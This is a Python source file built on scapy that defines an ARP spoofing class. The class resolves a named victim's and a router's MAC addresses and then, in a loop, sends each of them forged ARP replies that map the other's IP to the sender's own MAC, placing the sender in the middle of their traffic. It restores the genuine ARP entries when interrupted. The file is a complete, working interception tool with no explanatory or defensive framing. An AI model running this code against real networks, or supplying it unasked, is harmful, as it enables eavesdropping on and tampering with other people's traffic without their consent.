from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.layers.l2 import Ether, ARP, getmacbyip
import sys
import logging
import time
import signal
from scapy.sendrecv import sendp

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class ArpSpoofManager:
    def __init__(self, victim_ip, router_ip):
        self.victim_ip = victim_ip
        self.router_ip = router_ip
        self.victim_mac = getmacbyip(victim_ip)
        self.router_mac = getmacbyip(router_ip)
        self.my_mac = get_if_hwaddr(conf.iface)
        self.running = True

        # Set up signal handling
        signal.signal(signal.SIGINT, self.exit_gracefully)

    def send_packet(self, src_ip, dst_ip, src_mac, dst_mac):
        packet = Ether(src=src_mac, dst=dst_mac) / ARP(
            op=2, psrc=src_ip, hwsrc=src_mac, pdst=dst_ip, hwdst=dst_mac
        )
        sendp(packet, verbose=False)

    def restore_arp(self):
        self.send_packet(self.router_ip, self.victim_ip, self.router_mac, self.victim_mac)
        self.send_packet(self.victim_ip, self.router_ip, self.victim_mac, self.router_mac)
        print("\n[!] ARP tables restored.")

    def exit_gracefully(self, sig, frame):
        print("\n[!] Caught interrupt signal. Restoring ARP tables...")
        self.running = False  # Stop the loop

    def run(self):
        if not self.victim_mac or not self.router_mac:
            print("[!] Could not find MAC address. Exiting...")
            sys.exit(1)

        print("[!] Sending spoofed ARP packets....")
        try:
            while self.running:
                self.send_packet(self.router_ip, self.victim_ip, self.my_mac, self.victim_mac)
                self.send_packet(self.victim_ip, self.router_ip, self.my_mac, self.router_mac)
                time.sleep(2)
        finally:
            self.restore_arp()



